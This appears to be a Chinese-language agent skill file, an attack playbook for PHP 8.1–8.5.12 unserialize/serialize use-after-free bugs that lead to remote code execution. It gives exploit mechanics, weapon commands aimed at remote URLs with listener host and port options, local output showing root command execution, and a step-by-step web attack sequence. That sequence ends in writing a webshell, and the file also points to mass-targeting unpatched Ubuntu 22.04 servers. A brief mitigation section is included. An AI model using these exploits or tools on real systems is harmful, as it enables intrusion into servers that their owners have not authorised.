---
name: php-var-destroy-uaf-rce
description: Use when PHP 8.1–8.5.12 unserialize/serialize is a sink — var_destroy re-entry UAF → RCE (php2shell zeros).
---

# PHP 核心 var_destroy 重入 UAF → RCE（php2shell zeros / 存活到 8.5.12）

> 来源：`github.com/ACD421/PHP`（php2shell-zeros，2026-10-24，@acd421 / @J4ck3LSyN / @ArchKnight23）。
> 与 CVE-2026-109618/109619（2026-10-21 已修）是**两回事**：那批是 rfc1867/longjmp 类，这批是 var 层
> destroy 重入，修丁 `08f4b64`（GH-24373）**8.5.13 才发**，8.1–8.5.12 全部中招。

## 0. 命中判据（先看这三条）

1. 目标 PHP 在 **8.1.x – 8.5.12**（含 Debian/Ubuntu 发行版二进制；8.5.12 官方便是漏洞版）。`php -v` / `X-Powered-By` / composer.lock / `phpinfo.php`。
2. 应用对**用户可控数据**调用 `unserialize()`（cookie、隐藏域、API 参数、队列/导入接口、缓存 waker），**或**对用户构造的对象图调用 `serialize()`（zero5）。
3. 存在任一「有副作用的析构」类（写文件、调外部命令）→ 即可把 UAF 抬成 RCE。真实框架几乎必然有。

不满足 2 就没有这条链：这是**应用层 sink + 核心内存 bug** 的组合，不是「发个包就 RCE」。

## 1. 两个变体（同一 root cause：destroy 期间跑用户代码）

### zero4 — unserialize 侧 var_destroy 重入 UAF（CVSS 9.8）

- `php_var_unserialize` 把解码值挂在 `var_entries` 链上，每块 **1018 槽**（块约 8160 B）。
- `PHP_VAR_UNSERIALIZE_DESTROY` 逐槽 `i_zval_ptr_dtor`（`var_unserializer.c:319`）**没有** `BG(serialize_lock)` 括号；`__wakeup/__unserialize` 有。
- 载荷三要素：**元素数跨 1015–1018 块边界**（实测 1017 干净、**1018 触发**）＋ 同时带 `__wakeup`/`__destruct` 的对象 ＋ **尾部解码错误**（少一个 `}`）让该槽成为最后引用。
- 结果：`__destruct` 在 destroy 走链途中触发，嵌套 `unserialize()` 以 `level==1 / serialize_lock==0` 复用垂死上下文，在 `var_unserializer.c:906` 读已释放的 entries 链。
- 三档回执：ASAN（8.5.12 asan）· glibc SIGSEGV（`USE_ZEND_ALLOC=0`，槽索引取到 unsorted-bin fd → 野写）· 默认 ZendMM 下静默写（硬件 watchpoint 抓到 `data[3]=rval`、`used_slots 3→4` 写进已释放块）。
- 抬升：`R:N` 引用 + 用攻击者字符串回收该块 → `var_access` 返回**伪造 zval**（gdb：`rax=0x4242…` 完全可控）；有地址泄漏即任意读 / 16 B 写 → 伪造 `zend_object` + `get_class_name=zif_system` → 一次 `unserialize()` 直接 `uid=0`。

### zero5 — serialize 侧镜像（CVSS 9.8）

- `__sleep` 把对象其它属性引用置空（`$GLOBALS` 直写会触发 COW 检测，无效），使其成为 serialize 上下文 `d->ht` 里的最后引用。
- `php_var_serialize_destroy` → `zend_hash_destroy(&d->ht)` 释放最后引用 → **`__destruct` 在销毁循环内执行** → 析构里再 `serialize()`，`level != 0` 复用上下文，往正被销毁的 hash 插新条目。
- 重入载荷内 **≥6 个嵌套对象**迫使 `arData` 中途 `erealloc`，外层循环继续走已释放的旧 arData（**5 干净、6 触发**）。
- 8.5.11/8.1.2 在 glibc 下静默；8.5.12 ASAN 必现。收尾 `dtor_obj = zif_system` 直达 RCE。

### zero7/shape5 — enum autoload 的 `E:` UAF（CVSS 9.8，原创）

- 8.5.12 缺 `b4a63ec`（"Don't share the unserialize() context with enum autoloaders"），`E:` 枚举自动加载与解码共享上下文 → UAF。
- 投递面：**session decode 里含 `E:` 对象**（无需应用自己 unserialize，session 解码即触发）。
- 回执：4/4 `uid=0`，每次 ASLR 基址不同。

## 2. 武器（本仓库自带，单文件）

```bash
# 侦察 + 列链 + 打（远程 URL / docker / 本地二进制三模式）
python3 weapons/php2shell.py --target http://host/ [--lhost L] [--lport P]
python3 weapons/php2shell.py --local --php /usr/bin/php [--chain zero4] [--cmd 'id']
python3 weapons/php2shell.py --docker <container> --chain zero5 --cmd 'id; uname -a'
python3 weapons/php2shell.py --list-chains
python3 weapons/pwn_unserialize.py --local --php /path/php --chain zero4|zero5|both --cmd 'id'
python3 weapons/pwn_unserialize.py --target http://host/ --endpoint /import.php --field data
python3 weapons/pwn_unserialize.py --native-bridge http://app/          # → nativephp-bridge-rce
```

要点：
- `zif_system` **不靠硬编码**，武器自己扫 ELF RELA（输出 `rela-scan(canary 2/3)` + 偏移）；本地没符号表也能用。`pwn_unserialize.py` 单独跑则需要 `--zif-offset`（`nm php | grep zif_system` / dbgsym）。
- 本地模式会 `setarch -R`（关 ASLR），**Docker 目标要 `--security-opt seccomp=unconfined`**。
- 远程模式是「侦察 → 列可行链 → 选链 → 打 → 出回执」，链是否 VIABLE 取决于版本/端点/gadget。

## 3. 本机实测（2026-11-01，Debian PHP 8.3.6 CLI）

```bash
$ python3 weapons/php2shell.py --local --php /usr/bin/php --chain zero4 --cmd 'id'
[*] PHP 8.3.6 (local:/usr/bin/php8.3)
[+] zif_system = +0x244610 (rela-scan(canary 2/3))
[*] binary base 0x555555554000  ZendMM chunks 0x7ffff4a00000
  [zero4] VIABLE ...
[+] === zero4: FULL RCE === freed-block base 0x7ffff4a94000 (0s sweep)
[+] RECEIPT: uid=0(root) gid=0(root) groups=0(root)
```

不是「打印了自己的 id」——换成写文件证明是**被利用进程执行**：

```bash
--cmd 'id; echo MARKER_$(id -u)_$(hostname) > /tmp/p2s_marker.txt'
$ cat /tmp/p2s_marker.txt
MARKER_0_ser857116484689          # 由被打崩/被接管的 php 进程写出
```

同一台机 `--chain zero5` → `[-] window exhausted (11s)`：zero5 的堆几何按 **8.5.x** 校准，8.3 上要 `--max-tries` 或换 zero4（作者自己也这么写）。
另：`zero4/poc/vd3_reclaim.php` 在本机 PHP 8.3.6 直接 **core dump**（`timeout` 报 dumped core），vd4 在该 build 上 `SURVIVED`（需 8.5.12 ASAN 才必现）。

## 4. 远程实战序（web 目标）

1. **定版本**：`/phpinfo.php`、`?=PHP_VERSION`、报错页、`X-Powered-By`、静态 `.php` 版本串、composer.lock、`/vendor/composer/installed.json`。
2. **找 unserialize sink**：cookie 里 `a:`/`O:`/base64、`data=`/`payload=`/`state=` 参数、导入/队列/缓存接口、Laravel `X-XSRF` 解密后 sink、WordPress 插件 option 反序列化、`phar://`。
3. **确认 gadget**：任意「析构里写文件/发请求」的类（日志、缓存、文件清理、模板编译）。若应用把 `save_path` 放在 docroot，甚至不用 gadget（session 文件直接当 PHP 跑）。
4. **命中**：`php2shell.py --target` 让武器自己判链；不可行会写原因（版本、端点、gadget 缺哪一个）。
5. **收口**：写 shell 到 `upload/`、`storage/`、`cache/`；FPM 下用 `system()` 直接弹；确认 `id`。

## 5. Ubuntu 22.04 舰队（zero8）——组合拳

- Jammy 的 `php8.1` 停在 **8.1.2-1ubuntu2.27**（Ubuntu 至今未发 10 月补丁）→ 一次组合四段：**session-wipe → INI-UAF → 注入 → zero4 RCE**，ASLR on，回执 `uid=0`。
- 面：任何跑 stock jammy PHP 的站（大量）。判据：`Server: Apache/2.4.52 (Ubuntu)` + `X-Powered-By: PHP/8.1.2-1ubuntu2.27`。

## 6. 修 / 防（判修复用）

- 上游 `08f4b64`（GH-24373，2026-10-22）：destroy 前清上下文指针 + 重排；**8.5.13 起**。
- 8.5.13 仍缺 `C:` guard（另一条 DoS 面，见 `php-core-dos-toctou-2026`）。
- 应用侧唯一有效缓解：`unserialize($x, ['allowed_classes' => false])` 或改用 JSON；`session.serialize_handler` 全链路统一为 `php_serialize` 且两侧一致。

## 7. 坑

- **别把 local 模式当远程可行**：本地是「有二进制就能打」，远程要 sink + gadget，作者自己在 `WEAPONS.md` 的 Honest bounds 写了。
- `USE_ZEND_ALLOC=0` 才稳定 SIGSEGV；默认 ZendMM 是静默写（要 watchpoint 证明），所以「打了没反应」≠ 没中。
- 8.1/8.2 的 zero4 收尾几何与 8.5 不同，别拿 8.5 的偏移硬套；武器会自己扫，但 sweep 窗口可能空。
- 打 WordPress 这类站点不会留 PHP 错误日志（进程直接死），只能看 worker 重启 / 502 / `child pid exit signal Segmentation fault`。
- 该 repo 与作者此前那批「lab-assisted」包不同：本机零依赖复现成立（见 §3），但仍属**作者自称未修**的状态，判定目标是否已修要按 §6 的 commit/版本，不按 README。
